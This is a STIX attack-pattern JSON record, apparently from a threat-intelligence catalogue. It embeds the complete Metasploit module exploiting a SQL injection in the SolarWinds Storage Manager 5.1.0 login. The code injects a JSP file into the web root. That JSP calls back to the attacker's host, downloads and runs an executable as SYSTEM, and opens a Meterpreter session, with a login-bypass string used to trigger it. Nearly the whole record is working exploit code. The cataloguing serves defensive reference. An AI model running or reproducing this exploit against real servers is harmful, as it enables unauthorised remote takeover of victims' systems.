{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8e022f5c-1015-46de-b61d-09311f42e499",
    "created": "2024-08-14T16:55:00.661937Z",
    "modified": "2024-08-14T16:55:00.661941Z",
    "name": "\"Solarwinds Storage Manager 5.1.0 SQL Injection\"",
    "description": " This module exploits a SQL injection found in Solarwinds Storage Manager login interface.  It will send a malicious SQL query to create a JSP file under the web root directory, and then let it download and execute our malicious executable under the context of SYSTEM.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/solarwinds_storage_manager_sql.rb",
            "external_id": "solarwinds_storage_manager_sql.rb"
        },
        {
            "source_name": "reference",
            "url": "http://ddilabs.blogspot.com/2012/02/solarwinds-storage-manager-server-sql.html"
        },
        {
            "source_name": "reference",
            "url": "http://www.solarwinds.com/documentation/storage/storagemanager/docs/ReleaseNotes/vulnerability.htm"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::TcpServer\n  include Msf::Exploit::EXE\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Solarwinds Storage Manager 5.1.0 SQL Injection\",\n      'Description'    => %q{\n          This module exploits a SQL injection found in Solarwinds Storage Manager\n        login interface.  It will send a malicious SQL query to create a JSP file\n        under the web root directory, and then let it download and execute our malicious\n        executable under the context of SYSTEM.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'r@b13$', # Original discovery by Digital Defense VRT\n          'muts',   # PoC\n          'sinn3r'  # Metasploit\n        ],\n      'References'     =>\n        [\n          ['OSVDB', '81634'],\n          ['EDB', '18818'],\n          ['URL', 'http://ddilabs.blogspot.com/2012/02/solarwinds-storage-manager-server-sql.html'],\n          ['URL', 'http://www.solarwinds.com/documentation/storage/storagemanager/docs/ReleaseNotes/vulnerability.htm']\n        ],\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\",\n        },\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC' => \"none\"\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # Win XP / 2003 / Vista / Win 7 / etc\n          ['Windows Universal', {}]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2011-12-07',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptPort.new('RPORT', [true, 'The target port', 9000])\n      ])\n\n    self.needs_cleanup = true\n  end\n\n\n  #\n  # A very gentle check to see if Solarwinds Storage Manage exists or not\n  #\n  def check\n    res = send_request_raw({\n      'method' => 'GET',\n      'uri'    => '/LoginServlet'\n    })\n\n    if res and res.body =~ /\\<title>\\SolarWinds \\- Storage Manager\\<\\/title\\>/ and\n      res.body =~ /\\<img style=\"padding\\-top:30px;\" src=\"\\/images\\/logo_solarwinds_login\\.png\" width=\"163\" height=\"70\" alt=\"SolarWinds Storage Manager\"\\>/\n      return Exploit::CheckCode::Detected\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n\n  #\n  # Remove the JSP once we get a shell.\n  # We cannot delete the executable because it will still be in use.\n  #\n  def on_new_session(cli)\n    if cli.type != 'meterpreter'\n      print_error(\"Meterpreter not used. Please manually remove #{@jsp_name + '.jsp'}\")\n      return\n    end\n\n    cli.core.use(\"stdapi\") if not cli.ext.aliases.include?(\"stdapi\")\n\n    begin\n      jsp = @outpath.gsub(/\\//, \"\\\\\\\\\")\n      jsp = jsp.gsub(/\"/, \"\")\n      print_warning(\"#{rhost}:#{rport} - Deleting: #{jsp}\")\n      cli.fs.file.rm(jsp)\n      print_good(\"#{rhost}:#{rport} - #{@jsp_name + '.jsp'} deleted\")\n    rescue ::Exception => e\n      print_error(\"Unable to delete #{@jsp_name + '.jsp'}: #{e.message}\")\n    end\n  end\n\n\n  #\n  # Transfer the malicious executable to our victim\n  #\n  def on_client_connect(cli)\n    print_status(\"#{cli.peerhost}:#{cli.peerport} - Sending executable (#{@native_payload.length} bytes)\")\n    cli.put(@native_payload)\n    service.close_client(cli)\n  end\n\n\n  #\n  # Generate a download+exe JSP payload\n  #\n  def generate_jsp_payload\n    my_host = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(\"50.50.50.50\") : datastore['SRVHOST']\n    my_port = datastore['SRVPORT']\n\n    # tmp folder = C:\\Program Files\\SolarWinds\\Storage Manager Server\\temp\\\n    # This will download our malicious executable in base64 format, decode it back,\n    # save it as a temp file, and then finally execute it.\n    jsp = %Q|\n    <%@page import=\"java.io.*\"%>\n    <%@page import=\"java.net.*\"%>\n    <%@page import=\"sun.misc.BASE64Decoder\"%>\n\n    <%\n    StringBuffer buf = new StringBuffer();\n    byte[] shellcode = null;\n    BufferedOutputStream outstream = null;\n    try {\n      Socket s = new Socket(\"#{my_host}\", #{my_port});\n      BufferedReader r = new BufferedReader(new InputStreamReader(s.getInputStream()));\n      while (buf.length() < #{@native_payload.length}) {\n        buf.append( (char) r.read());\n      }\n\n      BASE64Decoder decoder = new BASE64Decoder();\n      shellcode = decoder.decodeBuffer(buf.toString());\n\n      File temp = File.createTempFile(\"#{@native_payload_name}\", \".exe\");\n      String path = temp.getAbsolutePath();\n\n      outstream = new BufferedOutputStream(new FileOutputStream(path));\n      outstream.write(shellcode);\n      outstream.close();\n\n      Process p = Runtime.getRuntime().exec(path);\n    } catch (Exception e) {}\n    %>\n    |\n\n    jsp = jsp.gsub(/\\n/, '')\n    jsp = jsp.gsub(/\\t/, '')\n\n    jsp.unpack(\"H*\")[0]\n  end\n\n\n  #\n  # Run the actual exploit\n  #\n  def inject_exec\n    # This little lag is meant to ensure the TCP server runs first before the requests\n    select(nil, nil, nil, 1)\n\n    # Inject our JSP payload\n    print_status(\"#{rhost}:#{rport} - Sending JSP payload\")\n    pass = rand_text_alpha(rand(10)+5)\n    hex_jsp  = generate_jsp_payload\n\n    res = send_request_cgi({\n      'method'    => 'POST',\n      'uri'       => '/LoginServlet',\n      'headers'   => {\n        'Accept-Encoding' => 'identity'\n      },\n      'vars_post'  => {\n        'loginState' => 'checkLogin',\n        'password'   => pass,\n        'loginName'  => \"AAA' union select 0x#{hex_jsp},2,3,4,5,6,7,8,9,10,11,12,13,14 into outfile #{@outpath}#\"\n      }\n    })\n\n    # Pick up the cookie, example:\n    # JSESSIONID=D90AC5C0BB43B5AC1396736214A1B5EB\n    if res and res.get_cookies =~ /JSESSIONID=(\\w+);/\n      cookie = res.get_cookies\n    else\n      print_error(\"Unable to get a session ID\")\n      return\n    end\n\n    # Trigger the JSP\n    print_status(\"#{rhost}:#{rport} - Trigger JSP payload\")\n    send_request_cgi({\n      'method'    => 'POST',\n      'uri'       => '/LoginServlet',\n      'headers'   => {\n        'Cookie' => cookie,\n        'Accept-Encoding' => 'identity'\n      },\n      'vars_post' => {\n        'loginState' => 'checkLogin',\n        'password'   => pass,\n        'loginName'  => \"1' or 1=1#--\"\n      }\n    })\n\n    res = send_request_raw({\n      'method'  => 'POST',\n      'uri'     => \"/#{@jsp_name + '.jsp'}\",\n      'headers' => {\n        'Cookie' => cookie\n      }\n    })\n\n    handler\n  rescue ::Exception => e\n    print_error(\"Failure attempting to inject exe: #{e.message}\")\n    cleanup\n  end\n\n\n  #\n  # The server must start first, and then we send the malicious requests\n  #\n  def exploit\n    # Avoid passing this as an argument for performance reasons\n    # This is in base64 is make sure our file isn't mangled\n    @native_payload      = [generate_payload_exe].pack(\"m*\")\n    @native_payload_name = rand_text_alpha(rand(6)+3)\n    @jsp_name            = rand_text_alpha(rand(6)+3)\n    @outpath             = \"\\\"C:/Program Files/SolarWinds/Storage Manager Server/webapps/ROOT/#{@jsp_name + '.jsp'}\\\"\"\n\n    begin\n      t = framework.threads.spawn(\"reqs\", false) { inject_exec }\n      print_status(\"Serving executable on #{datastore['SRVHOST']}:#{datastore['SRVPORT']}\")\n      super\n    ensure\n      t.kill\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-12-07",
    "x_mitre_platforms": [
        "win'"
    ]
}